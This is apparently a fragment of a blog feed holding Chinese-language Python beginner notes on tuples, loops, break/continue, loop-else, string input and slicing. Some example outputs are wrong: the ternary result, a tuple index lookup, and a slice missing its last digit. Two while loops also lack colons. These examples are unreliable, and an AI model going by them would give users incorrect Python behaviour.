class="built_in">type</span>(t1))<span class="meta"># &lt;class 'tuple'&gt;</span></span><br><span class="line"><span class="meta">#单个数据元组定义</span></span><br><span class="line">t2=(<span class="number">50</span>,)</span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">type</span>(t2))<span class="meta"># &lt;class 'tuple'&gt;</span></span><br><span class="line"><span class="meta">#必须加个逗号，否则数据类型就变成单个数据的类型的类型</span></span><br><span class="line">t3=(<span class="number">50</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="built_in">type</span>(t3))<span class="meta"># &lt;class 'int'&gt;</span></span><br></pre></td></tr></table></figure><p>##常用操作:查</p><blockquote><p>因为元组为不可变类型，所以只有 查 操作</p></blockquote><h3 id="index-1"><a href="#index-1" class="headerlink" title="index()"></a>index()</h3><blockquote><p>查找某个数据，如果数据存在，返回对应的的下标，否则报错，语法和列表，字符串的index方法相同。</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t1= (<span class="number">10</span>, <span class="number">20</span>, <span class="string">'bb'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(t1.index(<span class="string">'10'</span>)</span></span>)#<span class="number">0</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(t1.index(<span class="string">'bb'</span>)</span></span>)#<span class="number">2</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(t1.index(<span class="string">'aa'</span>)</span></span>)</span><br><span class="line"><span class="selector-id">#ValueError</span>: tuple.index(x): x not <span class="keyword">in</span> tuple</span><br></pre></td></tr></table></figure><h3 id="count-len"><a href="#count-len" class="headerlink" title="count() len()"></a>count() len()</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">count</span><span class="params">()</span></span>：返回某个数据在元组中几次</span><br><span class="line"><span class="function"><span class="title">len</span><span class="params">()</span></span>：返回元组总共有几个数据</span><br></pre></td></tr></table></figure><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t1= (<span class="number">10</span>, <span class="number">20</span>, 'bb',['a','b','c','bb'])</span><br><span class="line">print(<span class="name">t1</span>.count('bb'))#1</span><br><span class="line">print(<span class="name">len</span>(<span class="name">t1</span>))#4</span><br></pre></td></tr></table></figure><p>最后，赵丽颖镇楼！<br><img src="https://s2.ax1x.com/2019/09/19/nOsgw4.jpg" alt="nOsgw4.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;稳住，我可以的！今天学了脱壳，明天正确把De1CTF的Re_Sign给做出来！&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python系统学习2</title>
    <link href="http://yoursite.com/2019/09/19/python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A02/"/>
    <id>http://yoursite.com/2019/09/19/python系统学习2/</id>
    <published>2019-09-18T16:03:35.000Z</published>
    <updated>2019-09-19T16:00:41.976Z</updated>
    
    <content type="html"><![CDATA[<p>迷茫了快，不能这个样子！</p><a id="more"></a><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><blockquote><p>三目运算符也叫三元运算符或三元表达式</p></blockquote><blockquote><p>语法：条件成立时的表达式 if 条件 else 条件不成立执行的表达式</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=1</span><br><span class="line"><span class="attribute">b</span>=2</span><br><span class="line"></span><br><span class="line"><span class="attribute">c</span>=a <span class="keyword">if</span> a&gt;b <span class="keyword">else</span> b</span><br><span class="line"><span class="builtin-name">print</span> (c)#3</span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h2><blockquote><p>while语法</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件:</span><br><span class="line">    条件成立重复执行的代码1</span><br><span class="line">    条件成立重复执行的代码2</span><br><span class="line">    <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><blockquote><p>例子：</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#重复执行5遍 女朋友，我错了</span></span><br><span class="line"><span class="attribute">i</span>=0</span><br><span class="line"><span class="keyword">while</span> i&lt;5:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"女朋友，我错了\n"</span>)</span><br><span class="line">    i+=1</span><br><span class="line"><span class="builtin-name">print</span> (<span class="string">"原谅你了！"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#计算1-100的累加和</span></span><br><span class="line"><span class="attribute">i</span>=1</span><br><span class="line"><span class="attribute">s</span>=0</span><br><span class="line"><span class="keyword">while</span> i&lt;=100:</span><br><span class="line">    s+=i</span><br><span class="line">    i+=1</span><br><span class="line"><span class="builtin-name">print</span>(s)#5050</span><br></pre></td></tr></table></figure><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#计算1到100偶数的累加和</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">2</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">100</span>:</span><br><span class="line">    s+=i</span><br><span class="line">    i+=<span class="number">2</span></span><br><span class="line">print(s)#<span class="number">2550</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#i=2</span></span><br><span class="line"><span class="meta">#s=0</span></span><br><span class="line"><span class="meta">#while i&lt;=100:</span></span><br><span class="line"><span class="meta">#   if i%2==0:</span></span><br><span class="line"><span class="meta">#        s+=i</span></span><br><span class="line"><span class="meta">#   i+=1</span></span><br><span class="line"><span class="meta">#print(s)#2550</span></span><br></pre></td></tr></table></figure><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><blockquote><p>它两都是循环中满足一定退出循环的两种不同方式。</p></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break</span>：终止（整个）循环</span><br><span class="line"><span class="keyword">continue</span>：退出当前一次循环而执行下一次循环代码</span><br></pre></td></tr></table></figure><blockquote><p>举例：</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#break </span></span><br><span class="line"><span class="attribute">i</span>=1</span><br><span class="line"><span class="keyword">while</span> i&lt;=5</span><br><span class="line">    <span class="keyword">if</span>(<span class="attribute">i</span>==4):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"吃饱了，不吃了！"</span>)</span><br><span class="line">        break</span><br><span class="line">    <span class="builtin-name">print</span>(f<span class="string">'吃了第&#123;i&#125;个苹果'</span>)</span><br><span class="line">    i+=1</span><br><span class="line">    </span><br><span class="line"><span class="comment">#吃了第1个苹果</span></span><br><span class="line"><span class="comment"># 吃了第2个苹果</span></span><br><span class="line"><span class="comment"># 吃了第3个苹果</span></span><br><span class="line"><span class="comment"># 吃饱了，不吃了！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#continue</span></span><br><span class="line"><span class="attribute">i</span>=1</span><br><span class="line"><span class="keyword">while</span> i&lt;=5</span><br><span class="line">    <span class="keyword">if</span>(<span class="attribute">i</span>==3):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"这个苹果里面有个大虫子，这个苹果不吃了！"</span>)</span><br><span class="line">        i+=1</span><br><span class="line">        continue</span><br><span class="line">    <span class="builtin-name">print</span>(f<span class="string">'吃了第&#123;i&#125;个苹果'</span>)</span><br><span class="line">    i+=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 吃了第1个苹果</span></span><br><span class="line"><span class="comment"># 吃了第2个苹果</span></span><br><span class="line"><span class="comment"># 这个苹果里面有个大虫子，这个苹果不吃了！</span></span><br><span class="line"><span class="comment"># 吃了第4个苹果</span></span><br><span class="line"><span class="comment"># 吃了第5个苹果</span></span><br></pre></td></tr></table></figure><h3 id="while-嵌套"><a href="#while-嵌套" class="headerlink" title="while 嵌套"></a>while 嵌套</h3><blockquote><p>所谓while 嵌套，就是一个while里面嵌套一个while的写法，每个while和之前的基础语法是一样的</p></blockquote><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> j&lt;<span class="number">3</span>:</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">'媳妇二，我错了'</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'好了，原谅你了，刷晚饭的碗'</span>)</span><br><span class="line">    print(<span class="string">'一套惩罚结束---------------'</span>)</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 好了，原谅你了，刷晚饭的碗</span></span><br><span class="line"><span class="meta"># 一套惩罚结束---------------</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 好了，原谅你了，刷晚饭的碗</span></span><br><span class="line"><span class="meta"># 一套惩罚结束---------------</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 媳妇二，我错了</span></span><br><span class="line"><span class="meta"># 好了，原谅你了，刷晚饭的碗</span></span><br><span class="line"><span class="meta"># 一套惩罚结束---------------</span></span><br></pre></td></tr></table></figure><blockquote><p>下面我们用while 嵌套打印  9*9乘法表</p></blockquote><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">#打印星号（正方形）</span></span><br><span class="line"><span class="xml">j=1</span></span><br><span class="line"><span class="xml">while j<span class="tag">&lt;<span class="name">4:</span></span></span></span><br><span class="line"><span class="xml">    i=1</span></span><br><span class="line"><span class="xml">    while i<span class="tag">&lt;<span class="name">4:</span></span></span></span><br><span class="line"><span class="xml">        print("*" ,end="")</span></span><br><span class="line"><span class="xml">        i+=1</span></span><br><span class="line"><span class="xml">    print("")</span></span><br><span class="line"><span class="xml">    j+=1</span></span><br><span class="line"><span class="xml"># ***</span></span><br><span class="line"><span class="xml"># ***</span></span><br><span class="line"><span class="xml"># ***</span></span><br><span class="line"></span><br><span class="line"><span class="xml">#打印星号（三角形）</span></span><br><span class="line"><span class="xml">j=0</span></span><br><span class="line"><span class="xml">while j<span class="tag">&lt;<span class="name">4:</span></span></span></span><br><span class="line"><span class="xml">    i=0</span></span><br><span class="line"><span class="xml">    while i<span class="tag">&lt;<span class="name">=j:</span> #行和列 形成关系</span></span></span><br><span class="line"><span class="xml">        print("*" ,end="")</span></span><br><span class="line"><span class="xml">        i+=1</span></span><br><span class="line"><span class="xml">    print("")</span></span><br><span class="line"><span class="xml">    j+=1</span></span><br><span class="line"><span class="xml"># *</span></span><br><span class="line"><span class="xml"># **</span></span><br><span class="line"><span class="xml"># ***</span></span><br><span class="line"><span class="xml"># ****</span></span><br><span class="line"></span><br><span class="line"><span class="xml">#来了来了，放大招了！</span></span><br><span class="line"><span class="xml">j=1</span></span><br><span class="line"><span class="xml">while j<span class="tag">&lt;<span class="name">=9:</span></span></span></span><br><span class="line"><span class="xml">    i=1</span></span><br><span class="line"><span class="xml">    while i<span class="tag">&lt;<span class="name">=j:</span></span></span></span><br><span class="line"><span class="xml">        print(f'</span><span class="template-variable">&#123;i&#125;</span><span class="xml">*</span><span class="template-variable">&#123;j&#125;</span><span class="xml">=</span><span class="template-variable">&#123;i*j&#125;</span><span class="xml">',end="\t")</span></span><br><span class="line"><span class="xml">        i+=1</span></span><br><span class="line"><span class="xml">    print("")</span></span><br><span class="line"><span class="xml">    j+=1</span></span><br><span class="line"><span class="xml"># 1*1=1</span></span><br><span class="line"><span class="xml"># 1*2=2 2*2=4</span></span><br><span class="line"><span class="xml"># 1*3=3 2*3=6   3*3=9</span></span><br><span class="line"><span class="xml"># 1*4=4 2*4=8   3*4=12  4*4=16</span></span><br><span class="line"><span class="xml"># 1*5=5 2*5=10  3*5=15  4*5=20  5*5=25</span></span><br><span class="line"><span class="xml"># 1*6=6 2*6=12  3*6=18  4*6=24  5*6=30  6*6=36</span></span><br><span class="line"><span class="xml"># 1*7=7 2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49</span></span><br><span class="line"><span class="xml"># 1*8=8 2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64</span></span><br><span class="line"><span class="xml"># 1*9=9 2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81</span></span><br></pre></td></tr></table></figure><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><blockquote><p>语法</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字符串 元组 列表... 都可以是序列</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 序列</span><br><span class="line">    重复执行的代码1</span><br><span class="line">    重复执行的代码2</span><br><span class="line">    <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><blockquote><p>举例：(以及break continue在for 循环的应用)</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">str1</span>=<span class="string">"mutou"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">if</span>(<span class="attribute">i</span>=='o'):</span><br><span class="line">            break</span><br><span class="line">    <span class="builtin-name">print</span> (i)</span><br><span class="line"><span class="comment"># m</span></span><br><span class="line"><span class="comment"># u</span></span><br><span class="line"><span class="comment"># t</span></span><br></pre></td></tr></table></figure><blockquote><p>break 在哪的作用都是终止（整个循环）</p></blockquote><blockquote><p>comtinue 是跳过一次循环</p></blockquote><h2 id="循环配合else-配合使用"><a href="#循环配合else-配合使用" class="headerlink" title="循环配合else 配合使用"></a>循环配合else 配合使用</h2><blockquote><p>else下方缩进的代码指的是当循环正常结束之后要执行的代码</p></blockquote><blockquote><p>（循环不是正常结束的，else里面的代码是不会执行的）</p></blockquote><blockquote><p>手动说三遍！！！</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#因为 continue 是退出当前一次循环，继续下一次的循环，所以该循环在continue控制下是正常结束的，所以循环结束后，执行else里的代码</span></span><br><span class="line"><span class="attribute">i</span>=1</span><br><span class="line"><span class="keyword">while</span> i&lt;=5:</span><br><span class="line">    <span class="keyword">if</span> <span class="attribute">i</span>==3:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"这遍说得不真诚"</span>)</span><br><span class="line">        i+=1</span><br><span class="line">        continue</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"女朋友，我错了"</span>)</span><br><span class="line">    i+=1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"女朋友原谅我了，真开心！"</span>)</span><br><span class="line"><span class="comment"># 女朋友，我错了</span></span><br><span class="line"><span class="comment"># 女朋友，我错了</span></span><br><span class="line"><span class="comment"># 这遍说得不真诚</span></span><br><span class="line"><span class="comment"># 女朋友，我错了</span></span><br><span class="line"><span class="comment"># 女朋友，我错了</span></span><br><span class="line"><span class="comment"># 女朋友原谅我了，真开心！</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#但break  就是  属于  不正常 结束循环，不会执行else 代码块的代码</span></span><br><span class="line"><span class="attribute">i</span>=1</span><br><span class="line"><span class="keyword">while</span> i&lt;=5:</span><br><span class="line">    <span class="keyword">if</span> <span class="attribute">i</span>==3:</span><br><span class="line">       break</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"女朋友，我错了"</span>)</span><br><span class="line">    i+=1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"女朋友原谅我了，真开心！"</span>)</span><br><span class="line"><span class="comment"># 女朋友，我错了</span></span><br><span class="line"><span class="comment"># 女朋友，我错了</span></span><br></pre></td></tr></table></figure><h3 id="for…else"><a href="#for…else" class="headerlink" title="for…else"></a>for…else</h3><blockquote><p>语法：</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 序列:</span><br><span class="line">    重复执行的代码</span><br><span class="line">    <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    循环正常结束之后要执行的代码</span><br></pre></td></tr></table></figure><blockquote><p>同上</p></blockquote><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><blockquote><p>字符串是python 很重要的数据类型，用户输入都是作为字符串类型处理的</p></blockquote><h2 id="单引号，双引号，三引号"><a href="#单引号，双引号，三引号" class="headerlink" title="单引号，双引号，三引号"></a>单引号，双引号，三引号</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'hello'</span></span><br><span class="line">b=<span class="string">"I\'mutou"</span>  <span class="comment">#转义</span></span><br><span class="line">print(b)<span class="comment">#I'm mutou</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="string">'''yang'''</span></span><br><span class="line">d=<span class="string">"""world"""</span></span><br><span class="line">print(type(c))<span class="comment">#&lt;class 'str'&gt;</span></span><br><span class="line">print(type(d))<span class="comment">#&lt;class 'str'&gt;</span></span><br><span class="line"></span><br><span class="line">e=<span class="string">'hello '</span> \</span><br><span class="line">  <span class="string">'world'</span></span><br><span class="line">print(e)<span class="comment">#hello world   //即换行，输出格式不变，但在 自动产生一个 '\'符号</span></span><br><span class="line"></span><br><span class="line">f=<span class="string">'''hello </span></span><br><span class="line"><span class="string">world'''</span></span><br><span class="line">print(f)</span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># world    //即换行，输出格式也相应改变</span></span><br></pre></td></tr></table></figure><h2 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">print</span>(<span class="string">'hello,world'</span>)</span><br><span class="line"><span class="attribute">name</span>=<span class="string">'mutou'</span></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'我的名字是%s'</span> % name)</span><br><span class="line"><span class="builtin-name">print</span>(f<span class="string">'我的名字是&#123;name&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hello,world</span></span><br><span class="line"><span class="comment"># 我的名字是mutou</span></span><br><span class="line"><span class="comment"># 我的名字是mutou</span></span><br></pre></td></tr></table></figure><h2 id="字符串输入："><a href="#字符串输入：" class="headerlink" title="字符串输入："></a>字符串输入：</h2><blockquote><p>在Python中，使用input()接收用户输入</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">password</span>=input('请输入您的密码：')</span><br><span class="line"><span class="builtin-name">print</span>(f<span class="string">'您输入的密码是&#123;password&#125;'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(type(password))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请输入您的密码：521</span></span><br><span class="line"><span class="comment"># 您输入的密码是521</span></span><br><span class="line"><span class="comment"># &lt;class 'str'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><blockquote><p>切片是指对操作对象截取其中一部分的而操作。字符串，列表，元组都支持切片操作。</p></blockquote><blockquote><p>语法：序列[开始位置下标:结束位置下表:步长]</p></blockquote><blockquote><p>注意：不包含结束位置下表对应的的数据，正负整数均可；步长是选取间隔，正负整数均可默认为1</p></blockquote><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">str1='<span class="number">0123456789</span>'</span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">2</span>:<span class="number">5</span>:<span class="number">1</span>]) <span class="meta">#234</span></span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">2</span>:<span class="number">5</span>:<span class="number">2</span>]) <span class="meta">#24 步长相当于 下标 +2</span></span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">2</span>:<span class="number">5</span>]) <span class="meta">#234 </span></span><br><span class="line"><span class="keyword">print</span>(str1[:<span class="number">5</span>]) <span class="meta">#01234   如果不写开始，默认从零开始选取</span></span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">2</span>:])<span class="meta">#2345678 不写结束 表示选取到最后所有</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#负数测试</span></span><br><span class="line"><span class="keyword">print</span>(str1[::<span class="number">-1</span>])<span class="meta">#9876543210 如果步长为负数，表示倒着选取</span></span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">-4</span>:<span class="number">-1</span>]) <span class="meta">#678  下标表示最后一个顺据，依次向前类推</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#终极测试</span></span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">-4</span>:<span class="number">-1</span>:<span class="number">1</span>])<span class="meta">#678</span></span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">-4</span>:<span class="number">-1</span>:<span class="number">-1</span>])<span class="meta"># 不能去除数据：从-4开始到-1结束，选取方向从左到右，但是-1 步长表示 从右向左   冲突了！</span></span><br><span class="line"><span class="keyword">print</span>(str1[<span class="number">-1</span>:<span class="number">-4</span>:<span class="number">-1</span>])<span class="meta">#这样就可以了 987</span></span><br></pre></td></tr></table></figure><h2 id="常用操作方法："><a href="#常用操作方法：" class="headerlink" title="常用操作方法："></a>常用操作方法：</h2><ul><li>查找</li><li>修改</li><li>判断<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><blockquote><p>查找方法 即是查找字串在字符串中的位置 或出现的次数</p></blockquote></li></ul><h4 id="find"><a href="#find" class="headerlink" title="find():"></a>find():</h4><blockquote><p>检测某个字串是否包含在这个字符串中，如果在，返回这个字串开始的位置下表，否则则返回 -1</p></blockquote><blockquote><p>语法： 字符串序列.find(字串,开始位置下标,结束位置下标)</p></blockquote><blockquote><p>注意：开始和结束位置下表可以忽略，表示在整个字符串序列中找</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mystr</span>=<span class="string">"hello world and itcast and itheima and Python"</span></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(mystr.<span class="builtin-name">find</span>(<span class="string">'and'</span>))# 12</span><br><span class="line"><span class="builtin-name">print</span>(mystr.<span class="builtin-name">find</span>(<span class="string">'and'</span>,15,30))# 23</span><br><span class="line"><span class="builtin-name">print</span>(mystr.<span class="builtin-name">find</span>(<span class="string">'ands'</span>))#  返回-1    abds 不存在</span><br></pre></td></tr></table></figure><h4 id="index"><a href="#index" class="headerlink" title="index():"></a>index():</h4><blockquote><p>语法和find()函数相同  但find()查找不到时返回 -1 而 index函数 报错</p></blockquote><figure class="highlight 